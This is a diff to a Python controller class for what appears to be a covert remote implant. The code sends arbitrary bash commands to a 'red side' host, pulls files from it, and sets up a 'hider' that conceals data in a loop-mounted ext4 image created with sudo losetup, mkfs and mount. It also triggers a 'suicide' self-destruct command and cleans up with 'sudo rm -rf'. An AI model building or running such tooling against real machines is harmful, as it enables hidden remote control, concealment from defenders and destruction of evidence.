@@ -16,7 +16,8 @@ class Agent:
         self.conn = conn
         self.type = type
         self.mountedFS = False
-        self.mountPath = ""  # so its obviuos when debugging
+        self.mountPath = "" 
+        self.imagePath = "" 
         self.is_hider_active = False
 
     def __repr__(self) -> str:
@@ -31,7 +32,9 @@ class Agent:
 
     def run_bash(self, bash: str) -> tuple[Responce, str]:
         self.conn.send_command(Command(len(bash), FunCode.RUN_BASH, 0, bash))
-        return self.conn.recv_full_responce()
+        res = self.conn.recv_full_responce()
+        print(res)
+        return res
 
     """
     goes into loop of reading a command from stdin and executing on red side
@@ -68,8 +71,7 @@ class Agent:
                 fileName,
             )
         )
-        file_data = ic(self.conn.recv_file())
-        ic(len(file_data))
+        file_data = self.conn.recv_file()
         res = self.conn.recv_responce_struct()
         return res, file_data
     
@@ -82,8 +84,7 @@ class Agent:
                 '',
             )
         )
-        file_data = ic(self.conn.recv_file())
-        ic(len(file_data))
+        file_data = self.conn.recv_file()
         res = self.conn.recv_responce_struct()
         return res, file_data
 
@@ -131,13 +132,13 @@ class Agent:
     ) -> tuple[Responce, str]:
         self.is_hider_active = True
 
-        if self.mountPath:
-            mountPath = self.mountPath
+        # if self.mountPath:
+        #     mountPath = self.mountPath
 
-        self.mountPath = mountPath
-        self.hiding_env_setup(mountPath, imagePath)
+        # self.mountPath = mountPath
+        # self.hiding_env_setup(mountPath, imagePath)
 
-        strParam = hiderPath + ";" + imagePath + ";" + mountPath
+        strParam = hiderPath # + ";" + imagePath + ";" + mountPath
         self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
         return self.conn.recv_full_responce()
     
@@ -151,29 +152,31 @@ class Agent:
         self.run_bush("sudo systemctl status mytimer.timer")
 
     def hiding_env_setup(self, mountPath: str, imagePath: str):
-        res = self.run_bash(f"file {imagePath}")
+        res = self.run_bash(f"file {imagePath}")[1]
+        
         if "ext4" not in res:
             self.run_bash(f"dd if=/dev/zero of={imagePath} bs=1M count=100")
-            self.run_bash(f"sudo losetup /dev/loop0 {imagePath}")
-            self.run_bash(f"sudo mkfs.ext4 /dev/loop0")
-        self.mountFS(mountPath)
+            self.run_bash(f"sudo losetup /dev/loop11 {imagePath}")
+            self.run_bash(f"sudo mkfs.ext4 /dev/loop11")
+            self.imagePath = imagePath
+            self.mountFS(mountPath)
 
     def mountFS(self, mountPath=''):
         if not mountPath:
             return
         self.mountPath = mountPath
         self.run_bash(f"sudo mkdir {mountPath}")
-        self.run_bash(f"sudo mount /dev/loop0 {mountPath}")
+        self.run_bash(f"sudo mount /dev/loop11 {mountPath}")
 
     def unmountFS(self):
         if not self.mountPath:
             return
         self.run_bash(f"sudo umount {self.mountPath}")
-        self.run_bash(f"rm {self.mountPath}")
-        self.run_bash(f"sudo losetup -d /dev/loop0")
+        self.run_bash(f"sudo rm -rf {self.mountPath}")
+        self.run_bash(f"sudo rm {self.imagePath}")
+        self.run_bash(f"sudo losetup -d /dev/loop11")
 
     def suicide(self):
-        self.unmountFS()
         self.conn.send_command(Command(0, FunCode.SUICIDE, 0, ""))
         res = self.conn.recv_responce_struct()
         assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
